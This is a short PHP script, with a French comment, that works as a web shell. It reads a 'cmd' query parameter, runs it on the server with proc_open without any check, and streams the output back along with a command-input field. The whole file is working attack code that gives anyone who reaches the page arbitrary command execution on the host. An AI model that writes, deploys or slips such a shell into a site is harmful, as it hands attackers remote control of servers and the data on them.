<?php

header("Content-Type: text/plain"); // Utilisation d'un header pour spécifier le type de contenu de la page. Ici, il s'agit juste de texte brut (text/plain).

$cmd = (isset($_GET["cmd"])) ? $_GET["cmd"] : NULL;

if ($cmd != NULL) {
    $descriptorspec = array(
        0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
        1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
        2 => array("pipe", "w")    // stderr is a pipe that the child will write to
    );

    flush();

    $process = proc_open($cmd, $descriptorspec, $pipes, realpath('./'), array());

    echo realpath('.').'>'.$cmd.'<br />';

    if (is_resource($process)) {
        while ($s = fgets($pipes[1])) {
            print $s;
            flush();
        }
    }

    proc_close($process);
}

echo '<br />';
echo realpath('.').'><input type="text" onkeypress="if(window.event.keyCode==13){requestCommand(this.value);this.setAttribute(\'disabled\', \'true\');}" /><br />';